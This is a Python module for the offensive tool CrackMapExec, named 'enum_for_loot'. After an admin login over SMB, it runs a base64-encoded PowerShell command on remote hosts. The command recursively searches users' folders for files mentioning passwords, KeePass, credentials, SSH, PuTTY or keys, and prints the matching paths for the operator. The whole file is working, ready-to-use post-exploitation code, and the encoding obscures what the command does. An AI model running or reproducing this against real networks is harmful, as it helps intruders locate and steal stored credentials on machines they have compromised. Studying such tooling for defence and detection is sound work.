#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @dmcxblue

class CMEModule:

    name = 'enum_for_loot'
    description = "Find Interesting files that might hold credentials"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        '''     

    def on_admin_login(self, context, connection):

        command = 'powershell.exe -c "powershell.exe -Enc "RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgACIAQwA6AFwAVQBzAGUAcgBzACIAIAAtAFIAZQBjAHUAcgBzAGUAIAB8AFMAZQBsAGUAYwB0AC0AUwB0AHIAaQBuAGcAIAAtAFAAYQB0AHQAZQByAG4AIAAiACgAUABhAHMAcwB3AG8AcgBkAHMAKQB8ACgASwBlAGUAcABhAHMAcwApAHwAKABDAHIAZQBkAGUAbgB0AGkAYQBsAHMAKQB8ACgAcwBzAGgAKQB8ACgAUAB1AHQAdAB5ACkAfAAoAEsAZQB5ACkAfAAoAHEAQwBQACkAIgAgAC0ATABpAHMAdAAgAC0ASQBuAGMAbAB1AGQAZQAgACIAKgAuAHQAeAB0ACIALAAgACIAKgAuAHAAcwAxACIALAAiACoALgBwAGQAZgAiACwAIgAqAC4AcwBlAGMAcgBlAHQAcwAiACwAIgAqAC4AYwBmAGMAIgAsACIAKgAuAHIAdABmACIALAAiACoALgBrAGUAeQAiACwAIgAqAC4AawBkAGIAIgAsACAAIgAqAC4AYgBhAHQAIgAsACAAIgAqAC4AYwBvAG4AZgBpAGcAIgAsACAAIgAqAC4AYwBvAG4AZgBpAGcAIgAsACAAIgAqAC4AeABtAGwAIgAsACAAIgAqAC4AZABvAGMAeAAiACwAIAAiACoAeABsAHMAIgAsACAAIgAqAC4AZABvAGMAIgAsACAAIgAqAC4AeABsAHMAeAAiACwAIAAiACoALgBrAGQAYgB4ACIALAAgACIAKgAuAGUAeABlACIAIAB8AHMAZQBsAGUAYwB0ACAAUABhAHQAaAAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA="'
        context.log.info('Searching for Files')
        p = connection.execute(command, True)
        context.log.highlight(p)
